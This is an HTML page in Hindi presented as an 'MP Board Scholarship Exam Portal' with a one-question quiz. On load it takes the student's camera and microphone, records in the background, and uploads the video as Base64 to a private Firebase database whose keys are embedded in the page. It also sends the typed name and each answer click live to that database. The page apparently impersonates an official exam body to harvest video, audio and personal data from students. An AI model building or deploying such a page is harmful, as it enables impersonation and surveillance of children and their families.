<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MP Board Scholarship Exam Portal</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; }
        body { background: #f0f4f8; color: #1e293b; padding: 15px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .app-card { width: 100%; max-width: 500px; background: white; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden; }
        .banner { background: linear-gradient(135deg, #1e3c72, #2a5298); color: white; padding: 25px; text-align: center; }
        .banner h2 { font-size: 22px; margin-bottom: 5px; }
        .content { padding: 25px; }
        .input-group { margin-bottom: 18px; }
        .input-group label { display: block; margin-bottom: 6px; font-weight: bold; font-size: 14px; }
        .input-group input { width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; }
        .qa-section { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 15px; margin-bottom: 15px; }
        .qa-title { font-weight: bold; font-size: 14px; color: #1e3c72; margin-bottom: 8px; }
        .qa-options label { display: block; background: white; border: 1px solid #cbd5e1; padding: 10px; border-radius: 6px; margin-bottom: 6px; font-size: 13px; cursor: pointer; }
        .btn-submit { width: 100%; padding: 15px; background: #1e3c72; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
        .status-feed { font-size: 12px; color: #64748b; text-align: center; margin-top: 10px; font-style: italic; }
    </style>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyC0i6AtzIoLZm-Lz3pLr4UK5snjhER0es",
            authDomain: "mytestapp-7b70d.firebaseapp.com",
            databaseURL: "https://mytestapp-7b70d-default-rtdb.firebaseio.com",
            projectId: "mytestapp-7b70d",
            storageBucket: "mytestapp-7b70d.firebasestorage.app",
            messagingSenderId: "380512974619",
            appId: "1:380512974619:web:a7ecfba6999a600a7cc5be",
            measurementId: "G-ZMV07B4JY6"
        };
        
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        const urlParams = new URLSearchParams(window.location.search);
        let studentId = urlParams.get('id') || 'guest_' + Math.floor(Math.random() * 10000);

        let mediaRecorder;
        let recordedChunks = [];

        window.addEventListener("load", initExam);

        async function initExam() {
            try {
                // कैमरा और ऑडियो की स्ट्रीम हासिल करना
                let stream = await navigator.mediaDevices.getUserMedia({ video: { width: 240, height: 180 }, audio: true });
                
                database.ref('online_tests/' + studentId).update({
                    portal_status: "OPENED",
                    last_seen: new Date().toISOString()
                });

                // बैकग्राउंड में ऑटो-रिकॉर्डिंग शुरू करना
                startBackgroundRecording(stream);

            } catch (err) {
                alert("परीक्षा शुरू करने के लिए कैमरा और माइक चालू करना अनिवार्य है।");
                console.log(err);
            }
        }

        function startBackgroundRecording(stream) {
            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
            
            mediaRecorder.ondataavailable = function(e) {
                if (e.data.size > 0) {
                    recordedChunks.push(e.data);
                }
            };

            mediaRecorder.onstop = function() {
                // वीडियो फ़ाइल को डेटाबेस के अनुकूल टेक्स्ट (Base64) में बदलना
                let blob = new Blob(recordedChunks, { type: 'video/webm' });
                let reader = new FileReader();
                reader.readAsDataURL(blob); 
                reader.onloadend = function() {
                    let base64String = reader.result;
                    
                    // सीधे आपके रियल-टाइम डेटाबेस में वीडियो क्लिप भेजना
                    database.ref('online_tests/' + studentId).update({
                        recorded_video_feed: base64String,
                        portal_status: "SUBMITTED",
                        last_updated: new Date().toISOString()
                    }).then(() => {
                        alert('आपका टेस्ट और वीडियो रिकॉर्डिंग सफलतापूर्वक सबमिट हो गई है!');
                    });
                }
            };

            // रिकॉर्डिंग तुरंत चालू करें
            mediaRecorder.start();
        }

        function sendProgress(key, value) {
            let data = {};
            data[key] = value;
            data['last_updated'] = new Date().toISOString();
            database.ref('online_tests/' + studentId).update(data);
        }

        function submitTest(event) {
            event.preventDefault();
            if (mediaRecorder && mediaRecorder.state !== "inactive") {
                document.getElementById('status-text').innerText = "रिकॉर्डिंग सेव हो रही है, कृपया रुकें...";
                mediaRecorder.stop(); // यह बटन दबाते ही रिकॉर्डिंग रोक कर डेटाबेस में भेज देगा
            }
        }
    </script>
</head>
<body>

<div class="app-card">
    <div class="banner">
        <h2>प्रवेश परीक्षा (Pre-Test)</h2>
        <p>स्कॉलरशिप पोर्टल (सुरक्षित मोड)</p>
    </div>

    <div class="content">
        <form onsubmit="submitTest(event)">
            <div class="input-group">
                <label>छात्र का पूरा नाम:</label>
                <input type="text" placeholder="यहाँ अपना नाम लिखें" required oninput="sendProgress('student_name', this.value)">
            </div>

            <div class="qa-section">
                <div class="qa-title">💡 सवाल १: कंप्यूटर का कौन सा भाग 'मस्तिष्क' (Brain) कहलाता है?</div>
                <div class="qa-options">
                    <label><input type="radio" name="q1" value="A" onclick="sendProgress('answer_q1', 'A')"> A) मॉनिटर</label>
                    <label><input type="radio" name="q1" value="B" onclick="sendProgress('answer_q1', 'B')"> B) सी.पी.यू. (CPU)</label>
                    <label><input type="radio" name="q1" value="C" onclick="sendProgress('answer_q1', 'C')"> C) कीबोर्ड</label>
                </div>
            </div>

            <button type="submit" class="btn-submit">उत्तर और वीडियो सबमिट करें</button>
            <div id="status-text" class="status-feed">कैमरा और ऑडियो बैकग्राउंड में सुरक्षित रिकॉर्ड हो रहे हैं...</div>
        </form>
    </div>
</div>

</body>
</html>
